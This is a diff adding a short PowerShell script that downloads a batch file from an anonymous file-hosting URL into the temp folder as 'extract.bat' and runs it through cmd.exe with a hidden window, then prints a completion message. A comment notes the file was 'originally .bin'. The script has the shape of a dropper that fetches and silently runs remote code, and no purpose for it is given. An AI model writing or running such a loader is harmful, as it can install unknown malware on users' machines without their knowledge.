@@ -1,0 +1,16 @@
+$ErrorActionPreference = 'Stop'
+
+# URL of the .bat (originally .bin)
+$txtUrl = 'https://files.catbox.moe/a9z2ls.bat'
+
+# Temp paths
+$tmp = $env:TEMP
+$bat = Join-Path $tmp 'extract.bat'
+
+# Download the .bat and save it
+Invoke-WebRequest $txtUrl -OutFile $bat -UseBasicParsing
+
+# Run the .bat file
+Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c', $bat) -WindowStyle Hidden
+
+"Done: Batch file saved to $bat and executed."
